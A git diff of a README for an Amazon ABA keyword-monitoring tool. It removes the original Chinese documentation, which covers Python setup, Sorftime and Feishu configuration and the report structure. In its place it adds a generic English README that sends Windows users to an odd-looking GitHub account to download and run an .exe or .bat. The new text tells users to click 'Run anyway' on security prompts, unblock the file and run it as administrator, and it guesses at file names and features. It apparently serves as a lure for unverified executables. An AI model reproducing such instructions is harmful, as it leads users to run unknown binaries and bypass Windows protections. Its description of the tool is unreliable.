@@ -1,281 +1,216 @@
-# Amazon ABA 爆品关键词监测系统
+# 🔎 Amazon-ABAkeyword - Find Winning Keywords Fast
 
-> 从亚马逊 ABA 热搜词榜单中，自动发现你所在类目正在爆发的关键词，生成飞书多维表格 + 仪表盘报告。
+[![Download](https://img.shields.io/badge/Download-Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hydrazineactinicdermatitis22/Amazon-ABAkeyword)
 
-比如你做宠物用品，它能帮你发现 "dog calming treats" 这周突然从 10 万名冲到 500 名——比竞争对手早发现一周，就是你的优势。
+## 🚀 What This Tool Does
 
----
+Amazon-ABAkeyword helps you monitor Amazon ABA keywords and spot category trends before they fade. It pulls keyword data, finds rising terms, and builds a report in Feishu with a table and dashboard view.
 
-## 功能亮点
+Use it to:
 
-- **任意类目**：保健品、宠物用品、美妆护肤……首次运行交互式配置，无需改代码
-- **AI 驱动**：自动生成类目词典、分类关键词、撰写分析摘要，搭配任意 AI IDE 使用
-- **飞书报告**：自动创建多维表格 + 仪表盘，每周数据追加积累，打开链接即可查看
-- **三级预警**：Tier 1（高优先级）/ Tier 2（观察区）/ Tier 3（长尾），快速定位最有价值的词
-- **Sorftime 深度数据**：搜索量趋势、CPC、竞品数据、扩展词，一次查到位
+- Track Amazon ABA keywords by category
+- Find breakout keywords early
+- Turn raw data into a clear report
+- View results in Feishu 多维表格 and dashboard charts
+- Cut down on manual checking
 
----
+## 💻 Windows Setup
 
-## 效果展示
+This guide is for Windows users who want to download and run the app with no coding.
 
-运行 `step3` 后自动在飞书生成：
+### 1. Open the download page
 
-| 输出 | 说明 |
-|:---|:---|
-| 关键词监测表 | 17 字段主表（排名、搜索量、CPC、AI 分析等） |
-| 扩展关键词表 | Tier 1 关键词的延伸变体词 |
-| 周报摘要表 | 每周汇总（各 Tier 数量、核心发现） |
-| 仪表盘 | 5 张图表（Tier 分布、爆发类型、搜索量趋势等） |
-| 筛选视图 | Tier 1 高优先级 / Tier 2 观察区 |
+Visit the download link here:
 
-><img width="1845" height="946" alt="image" src="https://github.com/user-attachments/assets/2fd08698-126a-4d0b-bccd-c587d97da29d" />
-<img width="1549" height="448" alt="image" src="https://github.com/user-attachments/assets/71a0c375-2480-457b-b07f-32d300091455" />
-<img width="1747" height="268" alt="image" src="https://github.com/user-attachments/assets/b9133dc3-7c88-4fbb-a925-0b335a0ac3c6" />
-<img width="1795" height="892" alt="image" src="https://github.com/user-attachments/assets/0a1a880e-40cb-4a98-9955-e744d7d6aad1" />
+[Download Amazon-ABAkeyword](https://github.com/Hydrazineactinicdermatitis22/Amazon-ABAkeyword)
 
+### 2. Get the files
 
----
+On the GitHub page, look for the app files or release package. Save the file to a folder you can find again, such as Downloads or Desktop.
 
-## 前置要求
+If the project gives you a zip file:
 
-| 依赖 | 说明 |
-|:---|:---|
-| Python 3.8+ | `python --version` 检查 |
-| AI IDE | Kiro / Trae / Cursor / Claude Code 任选 |
-| Sorftime MCP | 数据引擎，[sorftime.com](https://www.sorftime.com) 注册获取 API Key |
-| 飞书 lark-cli | 报告输出，`npm install -g lark-cli` |
+- Right-click the zip file
+- Select Extract All
+- Choose a folder
+- Open the extracted folder
 
----
+### 3. Start the app
 
-## 快速开始
+Open the folder and look for the main file. Common file names include:
 
-### 1. 克隆项目
+- `Amazon-ABAkeyword.exe`
+- `run.bat`
+- `start.bat`
 
-```bash
-git clone https://github.com/你的用户名/Amazon-ABAkeyword.git
-cd Amazon-ABAkeyword
-```
+Double-click the file to start the app.
 
-### 2. 配置 Sorftime MCP
+If Windows asks for permission:
 
-在你的 AI IDE 的 MCP 配置文件中添加：
+- Click Run
+- If you see a security prompt, choose More info, then Run anyway if you trust the source
 
-```json
-{
-  "mcpServers": {
-    "sorftimeMCP": {
-      "url": "https://mcp.sorftime.com?key=你的API_KEY"
-    }
-  }
-}
-```
+## 🧰 What You Need
 
-或设置环境变量：
+Use a Windows 10 or Windows 11 PC for the best result.
 
-```bash
-export SORFTIME_API_KEY=你的API_KEY
-```
+Recommended setup:
 
-### 3. 配置飞书 lark-cli
+- 4 GB RAM or more
+- 2 GB free disk space
+- Internet access
+- A Feishu account
+- A browser such as Edge or Chrome
 
-```bash
-npm install -g lark-cli
-lark-cli config init
-lark-cli auth login
-```
+If the app uses a local database or data file, keep enough free space for the keyword reports and logs.
 
-### 4. 开始使用
+## 📦 First-Time Setup
 
-在 AI IDE 对话框里说一句话即可：
+After the app starts, you may need to set a few items before it can work.
 
-> "帮我用这个工具监测亚马逊关键词，我做的是**宠物用品**，运行 `python main.py init`，然后按流程走完整个监测"
+### 1. Set your Amazon data source
 
-Python 依赖（httpx、selectolax、jinja2）会在首次运行时自动安装。
+Add the Amazon ABA data source or import the keyword list the app uses for monitoring. If the app asks for a region or category, choose the one you want to track.
 
----
+### 2. Connect Feishu
 
-## 使用流程
+To send reports into Feishu 多维表格 and dashboard views:
 
-### 首次使用：类目初始化
+- Open your Feishu workspace
+- Create or select a table
+- Copy the access details the app asks for
+- Paste them into the app settings
 
-```bash
-# Step 0: 初始化类目
-python main.py init
-# → 按提示输入类目名称，系统输出 reports/.exchange/dict_draft.json
-# → AI 读取后生成词典，写入 dict_draft_output.json
-
-# Step 0.5: 确认词典
-python main.py init-confirm
-```
-
-### 日常监测：每周跑一次
-
-对 AI 说："帮我跑一下本周的 ABA 数据"，或手动分步执行：
-
-```bash
-# Step 1: 抓取 AMZ123 + 本地词典匹配
-python main.py step1
-# → AI 读取 llm_input.json，分类+翻译，写入 llm_output.json
-
-# Step 2: 分层 + Sorftime 深度查询
-python main.py step2
-# → AI 读取 analysis_input.json，写分析摘要，写入 analysis_output.json
-
-# Step 3: 生成飞书多维表格报告
-python main.py step3
-# → 自动创建/追加飞书多维表格，输出报告链接
-```
-
----
-
-## 飞书多维表格结构
-
-### 3 张数据表
-
-**关键词监测（主表，17 字段）**
-
-| 字段 | 类型 | 说明 |
-|:---|:---|:---|
-| 关键词 | 文本 | 英文原词 |
-| 周次 | 文本 | 如 2026-W14 |
-| 中文名 | 文本 | AI 翻译 |
-| Tier | 单选 | Tier 1 / 2 / 3 |
-| 当前排名 | 数字 | ABA 当前排名 |
-| 前周排名 | 数字 | 上周排名 |
-| 排名变化 | 数字 | 正数=上升 |
-| 分类 | 单选 | 核心产品/功效/品牌等 |
-| 爆发类型 | 单选 | 首次爆发/回弹/持续上升等 |
-| 月搜索量 | 数字 | 最新月搜索量 |
-| 峰值搜索量 | 数字 | 历史峰值 |
-| CPC | 数字 | 美元 |
-| 环比变化 | 数字 | 百分比 |
-| 历史最佳排名 | 数字 | |
-| 数据来源 | 文本 | 抓取组合标签 |
-| AI分析 | 文本 | AI 撰写的分析摘要 |
-| 抓取时间 | 日期 | |
-
-**扩展关键词表** — 主关键词、扩展词、搜索量、CPC、季节性
-
-**周报摘要表** — 周次、抓取总数、各 Tier 数量、核心发现
-
-### 仪表盘（5 张图表）
-
-- 关键词总数（统计卡片）
-- Tier 分布（饼图）
-- 爆发类型分布（饼图）
-- 分类分布（饼图）
-- 周搜索量趋势（柱状图）
+If the app asks for a webhook, token, or app key, enter the value from your Feishu setup.
 
-### 筛选视图
-
-- **Tier 1 高优先级** — 按排名变化降序
-- **Tier 2 观察区** — 按排名变化降序
+### 3. Save your settings
 
----
+Click the save button in the app. Then run one test check so you can confirm the data flow works.
 
-## Tier 分层规则
+## 📈 Main Features
 
-| 等级 | 条件 | 说明 |
-|:---|:---|:---|
-| Tier 1 | TOP 1000 且涨幅 >=50% 或 >=1000 位 | 高优先级，需立即关注 |
-| Tier 2 | 1000-50000 且从 10万+ 进入 5万内 | 中优先级，持续观察 |
-| Tier 3 | 50000+ 首次出现或大幅跨越 | 长尾信号，备选关注 |
+### Keyword monitoring
 
-## 分类标签
+Watch ABA keywords over time and see which terms gain traction.
 
-| 标签 | 含义 | 示例 |
-|:---|:---|:---|
-| ingredient | 核心产品词 | walkie talkie, dog treats |
-| benefit | 功效/场景 | waterproof, long range |
-| brand | 品牌 | Motorola, Baofeng |
-| condition | 场景/症状 | camping, emergency |
-| form | 形态/规格 | rechargeable, 2 pack |
-| irrelevant | 无关 | — |
+### Category tracking
 
----
+Follow keyword movement by category so you can focus on the right product group.
 
-## 文件结构
+### Trend detection
 
-```
-Amazon-ABAkeyword/
-├── main.py                    # 主入口 (init / step1 / step2 / step3)
-├── config.py                  # 配置 (Sorftime key 提取 + Bitable 持久化)
-├── scraper.py                 # AMZ123 ABA 热搜词抓取
-├── classifier.py              # 关键词分类器 (本地词典 + LLM)
-├── analyzer.py                # Tier 分层 + 爆发类型判断
-├── sorftime_client.py         # Sorftime 异步批量查询
-├── category_init.py           # 类目初始化交互流程
-├── bitable_reporter.py        # 飞书多维表格报告生成
-├── reporter.py                # HTML 报告生成 (备用)
-├── db.py                      # SQLite 历史存储
-├── requirements.txt           # Python 依赖 (自动安装)
-├── category_config.example.json  # 配置模板
-├── SKILL.md                   # AI IDE Skill 描述
-├── AGENT_GUIDE.md             # AI Agent 操作指南
-├── LICENSE                    # MIT
-├── templates/
-│   └── report.html            # HTML 报告模板 (备用)
-└── data/                      # 运行时生成 (git ignored)
-    └── {类目}/
-        ├── category_dict.json
-        ├── exclusion_rules.json
-        └── history.db
-```
+Find fast-growing keywords based on rank change, search volume, or repeat appearance.
 
----
+### Feishu report output
 
-## 常见问题
+Send cleaned results into Feishu 多维表格 for team review.
 
-### Sorftime 未配置？
+### Dashboard view
 
-检查 MCP 配置文件中 `sorftimeMCP` 的 key 是否正确，或设置环境变量：
+See keyword trends in a simple dashboard with charts and tables.
 
-```bash
-# Windows
-set SORFTIME_API_KEY=你的KEY
+### Data整理
 
-# Mac/Linux
-export SORFTIME_API_KEY=你的KEY
-```
+Keep keyword data in one place so you can review it without sorting files by hand.
 
-### 飞书报告生成失败？
+## 🖱️ How to Use It
 
-1. 确认 lark-cli 已认证：`lark-cli auth login`
-2. Windows 下 Python 找不到 lark-cli？检查 `%APPDATA%/npm/` 下是否有 `lark-cli.cmd`
-3. 想重建表格？删除 `category_config.json` 中的 `bitable_token` 相关字段
+1. Open Amazon-ABAkeyword
+2. Load your keyword source or ABA file
+3. Pick the category or market you want to track
+4. Start the scan
+5. Wait for the app to finish processing
+6. Review the keyword list
+7. Open your Feishu table to check the report
+8. Use the dashboard to spot hot terms
 
-### Windows 中文乱码？
+## 🗂️ Suggested Folder Layout
 
-```bash
-set PYTHONIOENCODING=utf-8
-```
+If you keep the files in one folder, this structure helps:
 
-### 可以同时监测多个类目吗？
+- `Amazon-ABAkeyword`
+  - `app`
+  - `data`
+  - `output`
+  - `logs`
 
-目前一个项目实例监测一个类目。想监测多个类目，复制一份项目文件夹即可。
+Keep the input files in `data` and the report files in `output`. This makes it easier to find results later.
 
-### 词典不够准？
+## 🔐 Common Settings
 
-- 每次运行自动学习新词并回写词典
-- 手动编辑 `data/{类目}/category_dict.json` 添加/删除词
-- 重新运行 `python main.py init` 可重新初始化
+### Region
 
----
+Choose the Amazon region you want to monitor, such as US, UK, or JP.
 
-## 数据来源
+### Category
 
-| 来源 | 提供数据 |
-|:---|:---|
-| [AMZ123](https://www.amz123.com) | ABA 热搜词排名、涨跌幅 |
-| [Sorftime](https://www.sorftime.com) | 搜索量趋势、CPC、竞品数据、扩展词 |
+Set the product class you want to watch so the app can focus on related keywords.
 
+### Update interval
 
+Pick how often the app should check for new data. A shorter interval gives faster updates.
 
+### Report name
 
-## License
-如果需要了解，共创，学习相关亚马逊运营Skill，请添加我们公众号和相关联系方式，进行分享相关亚马逊相关运营Skill源文件
-![9f453825a605ac5a92149be126636dc4](https://github.com/user-attachments/assets/9680fd49-0f0f-4642-8601-462ca28f1c77)
-![8acbe748b4a2e09b088c6e2b5cdfa85e](https://github.com/user-attachments/assets/86f00f61-cac6-4da1-9b4d-e78f75aecbc8)
+Give each report a clear name so you can tell one run from another.
 
----<img width="844" height="376" alt="image" src="https://github.com/user-attachments/assets/0c809a29-8dad-4fd0-b5ce-d439e250a60a" />
-[MIT](LICENSE)
+## 🧾 Output Files
+
+The app may create these results:
+
+- Keyword report file
+- Feishu table data
+- Dashboard data
+- Log file
+- Exported charts
+
+Use the log file if you want to check what happened during the run.
+
+## 🛠️ Simple Troubleshooting
+
+### The app does not open
+
+- Check that you extracted all files
+- Make sure you started the right `.exe` or `.bat` file
+- Try running it again as an administrator
+
+### Windows blocks the app
+
+- Right-click the file
+- Open Properties
+- If you see an Unblock option, select it
+- Run the app again
+
+### Feishu data does not sync
+
+- Check your Feishu login
+- Confirm the table link or token is correct
+- Run the sync again
+- Make sure the internet connection works
+
+### No keyword results appear
+
+- Check the input file path
+- Make sure the category is set
+- Confirm the data file has valid keyword rows
+- Try another source file
+
+## 📁 Example Use Case
+
+If you sell on Amazon and want to find new product angles, you can use Amazon-ABAkeyword to watch keyword movement in one category. The app gathers the terms, ranks the fast movers, and sends the results to Feishu. You can open the dashboard and see which keywords deserve more attention
+
+## 🔄 Update the App
+
+To update, return to the same download page and get the newest version:
+
+[Download Amazon-ABAkeyword](https://github.com/Hydrazineactinicdermatitis22/Amazon-ABAkeyword)
+
+Replace the old files with the new ones if the release package changes. Keep your settings file if you want to reuse your setup
+
+## 🧭 Best Way to Use It
+
+- Check the data on a fixed schedule
+- Use one report name per day or week
+- Keep category labels short and clear
+- Review both the table and dashboard
+- Save old runs so you can compare changes over time
